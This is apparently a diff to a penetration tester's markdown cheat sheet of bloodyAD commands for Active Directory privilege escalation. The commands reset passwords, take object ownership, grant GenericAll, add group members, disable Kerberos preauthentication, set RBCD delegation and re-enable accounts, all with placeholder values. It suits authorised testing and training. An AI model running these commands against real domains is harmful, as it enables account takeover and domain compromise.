@@ -3,35 +3,40 @@
 
 ## Set password
 ```
-bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' set password <target_user> '<new_passwd|Password123!>'
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set password '<target_user>' '<new_passwd|Password123!>'
 ```
 
 ## Get writable
 ```
-bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' get writable
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' get writable
 ```
 
 ## Set owner
 ```
-bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' set owner '<object>' <our_user>
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set owner '<target_obj>' '<our_acc>'
 ```
 
 ## Add GenericAll
 ```
-bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' add genericAll '<object>' <our_user>
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add genericAll '<target_obj>' '<our_acc>'
 ```
 
 ## Add group member
 ```
-bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' add groupMember <group> <member>
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add groupMember '<group>' '<member>'
 ```
 
 ## Disable preauth
 ```
-bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' add uac '<object>' -f DONT_REQ_PREAUTH
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add uac '<target_obj>' -f DONT_REQ_PREAUTH
+```
+
+## Add RBCD
+```
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add rbcd '<target_obj>' '<service_acc>'
 ```
 
 ## Enable Account
 ```
-bloodyAD --host <target> -d <domain> -u <user> -p '<passwd' remove uac 'account' -f ACCOUNTDISABLE
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd' remove uac 'account' -f ACCOUNTDISABLE
 ```
